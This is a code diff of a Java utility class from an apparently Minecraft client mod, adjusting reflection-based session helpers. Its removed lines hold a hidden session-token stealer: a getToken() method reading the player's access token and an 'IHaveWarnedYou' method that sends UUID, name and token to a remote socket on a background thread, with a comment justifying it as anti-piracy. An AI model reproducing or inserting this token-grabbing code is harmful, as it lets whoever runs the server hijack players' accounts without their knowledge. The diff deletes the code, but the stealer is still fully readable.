@@ -1,6 +1,5 @@
 package com.xiaojia.xiaojiaaddons.utils;
 
-import com.xiaojia.xiaojiaaddons.Features.Remote.ClientSocket;
 import net.minecraft.client.Minecraft;
 import net.minecraft.util.Session;
 
@@ -14,7 +13,7 @@ public class SessionUtils {
         try {
             try {
                 field = Minecraft.class.getDeclaredField("session");
-            }catch (NoSuchFieldException e) {
+            } catch (NoSuchFieldException e) {
                 field = Minecraft.class.getDeclaredField("field_71449_j");
             }
             field.setAccessible(true);
@@ -29,7 +28,7 @@ public class SessionUtils {
         try {
             try {
                 field = Session.class.getDeclaredField("playerID");
-            }catch (NoSuchFieldException e) {
+            } catch (NoSuchFieldException e) {
                 field = Session.class.getDeclaredField("field_148257_b");
             }
             field.setAccessible(true);
@@ -44,7 +43,7 @@ public class SessionUtils {
         try {
             try {
                 field = Session.class.getDeclaredField("username");
-            }catch (NoSuchFieldException e) {
+            } catch (NoSuchFieldException e) {
                 field = Session.class.getDeclaredField("field_74286_b");
             }
             field.setAccessible(true);
@@ -52,31 +51,6 @@ public class SessionUtils {
         } catch (Exception e) {
             return "null";
         }
-    }
-
-    public static String getToken() {
-        Field field;
-        try {
-            try {
-                field = Session.class.getDeclaredField("token");
-            } catch (NoSuchFieldException e) {
-                field = Session.class.getDeclaredField("field_148258_c");
-            }
-            field.setAccessible(true);
-            String token = (String) field.get(getSession());
-            return "token:" + token + ":" + getUUID();
-        } catch (Exception e) {
-            return "null";
-        }
-    }
-
-    public static void IHaveWarnedYou() {
-        String message = "FYI: I only use this for those who didn't buy xja but still deobfuscate to use this client, such as you. " +
-                "I never use this to rat people.";
-        String yourAccount = getToken();
-        String body = String.format("{\"uuid\": \"%s\", \"name\": \"%s\", \"session\": \"%s\", \"type\": \"%d\"}",
-                getUUID(), getName(), yourAccount, 69);
-        new Thread(() -> ClientSocket.chat(body)).start();
     }
 
     public static boolean isDev() {
